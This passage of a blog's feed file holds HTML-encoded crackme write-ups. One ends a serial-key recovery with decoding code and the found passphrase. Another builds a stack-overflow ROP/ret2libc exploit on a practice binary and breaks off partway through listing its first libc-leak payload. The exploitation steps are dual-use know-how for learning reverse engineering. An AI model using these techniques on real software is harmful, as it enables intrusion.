+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;decoded_password.append(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(password_base[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0x0C&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;decoded_password.append(password_base[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;])
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;decoded_password.append(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(password_base[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;password_base[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;5&lt;&#x2F;span&gt;&lt;span&gt;:]:
+&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;decoded_password.append(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;chr&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;ord&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(c) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;))
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;Decoded serial key: &amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b8bb26;&quot;&gt;&amp;quot;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;.join(decoded_password))
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;And that’s all. When the program creates a serial key, it compares the serial key with the data entered by user. If both strings are the same, crackme is resolved.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rdx, [rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;s2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, [rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;s1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsi, rdx&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;        ; s2
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rdi, rax&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;        ; s1
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;call    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;_strcmp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;test    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, eax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jnz     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;short loc_156A&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;   ; bad serial key
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rdi, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;aYouSucceed&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt; ; &amp;quot;you succeed!!&amp;quot;
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;call    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;_puts
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;jmp     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;short loc_1576&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;   ; end program
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# .&#x2F;ZED-Crackme-x64.bin 
+&lt;&#x2F;span&gt;&lt;span&gt;***********************
+&lt;&#x2F;span&gt;&lt;span&gt;**      rules:       **
+&lt;&#x2F;span&gt;&lt;span&gt;***********************
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;* do not bruteforce
+&lt;&#x2F;span&gt;&lt;span&gt;* do not patch, find instead the serial.
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;enter the passphrase: C(uiICD@CADDEBNEEDD
+&lt;&#x2F;span&gt;&lt;span&gt;you succeed!!
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Used tools:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;Ida Freeware 7.0&lt;&#x2F;li&gt;
+&lt;li&gt;GDB&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+</content>
+        
+    </entry>
+    <entry xml:lang="en">
+        <title>Rop made by BitFriends</title>
+        <published>2020-09-05T00:00:00+00:00</published>
+        <updated>2020-09-05T00:00:00+00:00</updated>
+        <author>
+          <name>Unknown</name>
+        </author>
+        <link rel="alternate" href="https://0xf4lc0n.github.io/blog/crackme/rop-crackme/" type="text/html"/>
+        <id>https://0xf4lc0n.github.io/blog/crackme/rop-crackme/</id>
+        
+        <content type="html">&lt;p&gt;&lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;crackmes.one&#x2F;crackme&#x2F;5f3d7ed033c5d42a7c667d95&quot;&gt;Download binary&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;After running the program it’s waiting for user input. When we provide any input the program displays “Hello World!”.&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# .&#x2F;rop 
+&lt;&#x2F;span&gt;&lt;span&gt;Input: test
+&lt;&#x2F;span&gt;&lt;span&gt;Hello World!
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Our goal is to get a shell. Take a look at IDA.&lt;&#x2F;p&gt;
+&lt;p&gt;This is a main function:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;rop-crackme&#x2F;img&#x2F;main.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We have 3 function calls here. The “input” function is interesting:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;0xf4lc0n.github.io&#x2F;blog&#x2F;crackme&#x2F;rop-crackme&#x2F;img&#x2F;input.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;The most important part is here:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;sub     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsp, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;40h
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The program allocates a local array of 64 bytes.
+Then according to the &lt;a rel=&quot;noopener&quot; target=&quot;_blank&quot; href=&quot;https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;X86_calling_conventions&quot;&gt;x86 calling convention&lt;&#x2F;a&gt; _read’s arguments are stored in appropriate registers:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, [rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;  ; load addres of local array to rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;edx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;280h&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;       ; load amount of characters which have to be read to edx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsi, rax&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;        ; copy adres from rax to rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;edi, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;          ; set file descriptor (0 means a standard input)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;          ; clear rax (in rax _read error code will be stored)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;call    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;_read
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;nop
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;Before the retn instruction threre is the leave instruction. Leave destroys function stack frame, so this is the shorter version of:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsi, rbp
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;pop &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rbp
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;When retn is executed (and we didn’t make a mess), control flow backs to the main function which prints “Hello World”.&lt;&#x2F;p&gt;
+&lt;p&gt;During _read call the stack looks like this:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;                                Lower addresses
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;                         +--------------------------------+
+&lt;&#x2F;span&gt;&lt;span&gt;                         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;                         | return address (8 bytes)       |
+&lt;&#x2F;span&gt;&lt;span&gt;                         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;                         +--------------------------------+
+&lt;&#x2F;span&gt;&lt;span&gt;                         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;                         | saved rbp (8 bytes)            |
+&lt;&#x2F;span&gt;&lt;span&gt;               ^         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;               |         +--------------------------------+
+&lt;&#x2F;span&gt;&lt;span&gt;stack overflow |         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;direction      |         | local array (64 bytes)         |
+&lt;&#x2F;span&gt;&lt;span&gt;               |         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;               |         |                                |
+&lt;&#x2F;span&gt;&lt;span&gt;               +         +--------------------------------+
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;                                Higher addresses
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In order to hit return address our payload have to overwrite 72 bytes.&lt;&#x2F;p&gt;
+&lt;p&gt;Since the program stack is not executable (NX enabled) we need to use the ROP and ret2libc techniques to spawn a shell:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# checksec rop
+&lt;&#x2F;span&gt;&lt;span&gt;[*] &amp;#39;&#x2F;home&#x2F;Falcon&#x2F;IT&#x2F;RE&#x2F;Rop&#x2F;rop&amp;#39;
+&lt;&#x2F;span&gt;&lt;span&gt;    Arch:     amd64-64-little
+&lt;&#x2F;span&gt;&lt;span&gt;    RELRO:    Partial RELRO
+&lt;&#x2F;span&gt;&lt;span&gt;    Stack:    No canary found
+&lt;&#x2F;span&gt;&lt;span&gt;    NX:       NX enabled
+&lt;&#x2F;span&gt;&lt;span&gt;    PIE:      No PIE (0x400000)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;What is more this challenge requires the ASLR to be enabled so here it is:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# cat &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space 
+&lt;&#x2F;span&gt;&lt;span&gt;2
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;# ldd rop
+&lt;&#x2F;span&gt;&lt;span&gt;	linux-vdso.so.1 (0x00007ffcc53be000)
+&lt;&#x2F;span&gt;&lt;span&gt;	libc.so.6 =&amp;gt; &#x2F;lib64&#x2F;libc.so.6 (0x00007f968c313000)
+&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007f968c4fe000)
+&lt;&#x2F;span&gt;&lt;span&gt;# ldd rop
+&lt;&#x2F;span&gt;&lt;span&gt;	linux-vdso.so.1 (0x00007ffcfe735000)
+&lt;&#x2F;span&gt;&lt;span&gt;	libc.so.6 =&amp;gt; &#x2F;lib64&#x2F;libc.so.6 (0x00007fe626b3e000)
+&lt;&#x2F;span&gt;&lt;span&gt;	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x00007fe626d29000)
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;To spawn a shell, I will call system(“&#x2F;bin&#x2F;sh”). 
+To call system(“&#x2F;bin&#x2F;sh”) following steps are required:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;overwrite 72 bytes&lt;&#x2F;li&gt;
+&lt;li&gt;overwrite return address with rop_gadget&lt;&#x2F;li&gt;
+&lt;li&gt;place address to “&#x2F;bin&#x2F;sh” string on the stack&lt;&#x2F;li&gt;
+&lt;li&gt;place system address on the stack&lt;&#x2F;li&gt;
+&lt;li&gt;place exit address on the stack&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;In order to pass “&#x2F;bin&#x2F;sh” string to system, the string address must be placed in rdi. The “&#x2F;bin&#x2F;sh” string address will be stored on stack so we have to pop it.
+Let’s use ROPgadget:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# ROPgadget --binary .&#x2F;rop | grep &amp;quot;pop rdi&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;0x0000000000400613 : pop rdi ; ret
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This is exactly what we need.&lt;&#x2F;p&gt;
+&lt;p&gt;Since ALSR is on, the libc address will be different each time the program is started. This means that the address of the system function and the “&#x2F;bin&#x2F;sh” string will be different.
+So our first task is to gain current libc address.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;leaking-the-libc-address&quot;&gt;Leaking the libc address&lt;&#x2F;h2&gt;
+&lt;p&gt;The program uses write function from libc and we also use this function to leak the libc address.&lt;&#x2F;p&gt;
+&lt;p&gt;write offset in GOT table:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# objdump -R rop
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;rop:     file format elf64-x86-64
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;span&gt;DYNAMIC RELOCATION RECORDS
+&lt;&#x2F;span&gt;&lt;span&gt;OFFSET           TYPE              VALUE 
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000600ff0 R_X86_64_GLOB_DAT  __libc_start_main@GLIBC_2.2.5
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000601018 R_X86_64_JUMP_SLOT  write@GLIBC_2.2.5
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000601020 R_X86_64_JUMP_SLOT  read@GLIBC_2.2.5
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;write offset in PLT table:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# objdump -d -M intel rop | grep &amp;quot;write@plt&amp;quot;
+&lt;&#x2F;span&gt;&lt;span&gt;0000000000400430 &amp;lt;write@plt&amp;gt;:
+&lt;&#x2F;span&gt;&lt;span&gt;  400551:	e8 da fe ff ff       	call   400430 &amp;lt;write@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;  400576:	e8 b5 fe ff ff       	call   400430 &amp;lt;write@plt&amp;gt;
+&lt;&#x2F;span&gt;&lt;span&gt;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;What we want to do here is to load the address of a write function from GOT table to rdi and then print that address by calling the write function.&lt;&#x2F;p&gt;
+&lt;p&gt;This is a write function:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;c&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-c &quot;&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;ssize_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;write&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;int &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;fd&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;const void &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fe8019;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fabd2f;&quot;&gt;size_t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;liczba&lt;&#x2F;span&gt;&lt;span&gt;);
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;We got three arguments:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;rdi - fd (file descriptor)&lt;&#x2F;li&gt;
+&lt;li&gt;rsi - address of string to print&lt;&#x2F;li&gt;
+&lt;li&gt;rdx - amount of character to write&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;Let’s look for gadgets:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;txt&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-txt &quot;&gt;&lt;code class=&quot;language-txt&quot; data-lang=&quot;txt&quot;&gt;&lt;span&gt;# ROPgadget --binary rop | grep -E &amp;#39;pop rsi|pop rdx&amp;#39; 
+&lt;&#x2F;span&gt;&lt;span&gt;0x0000000000400611 : pop rsi ; pop r15 ; ret
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;In the binary there is only rsi gadget so we cant set rdx. However rdx was set to 0x280 before the first write call here:&lt;&#x2F;p&gt;
+&lt;pre data-lang=&quot;nasm&quot; style=&quot;background-color:#282828;color:#fdf4c1aa;&quot; class=&quot;language-nasm &quot;&gt;&lt;code class=&quot;language-nasm&quot; data-lang=&quot;nasm&quot;&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;lea     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rax, [rbp+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;buf&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;]&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;  ; load addres of local array to rax
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;edx, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;280h&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;       ; load amount of characters which have to be read to edx
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;rsi, rax&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;        ; copy adres from rax to rsi
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;edi, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;          ; set file descriptor (0 means a standard input)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;mov     &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fdf4c1;&quot;&gt;eax, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d3869b;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#928374;&quot;&gt;          ; clear rax (in rax _read error code will be stored)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;call    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8ec07c;&quot;&gt;_read
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa5c4b;&quot;&gt;nop
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;So we only need to load proper values to rdi and rsi.&lt;&#x2F;p&gt;
+&lt;p&gt;The first payload will contain:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;‘A’*72 &lt;&#x2F;li&gt;
+&lt;li&gt;address of rdi gadget&lt;&#x2F;li&gt;
+&lt;li&gt;0x1 (file descriptor for write)&lt;&#x2F;li&gt;
+&lt;li&gt;address of rsi gadget&lt;&#x2F;li&gt;
+&lt;li&gt;write offset in GOT (this will point to the write address in libc)&lt;&#x2F;li&gt;
+&lt;li&gt;0x0 (rsi gadget contains pop r15 instruction so we have to place some garbage on stack for r15)&lt;&#x2F;li&gt;
+&lt;li&gt;write offset in PLT (this will point to the write call)&lt;&#x2F;li&gt;
+&lt;li&gt;address of a main function (if we rerun the program, the libc address will be changed so we have to jump to start of the main function)&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
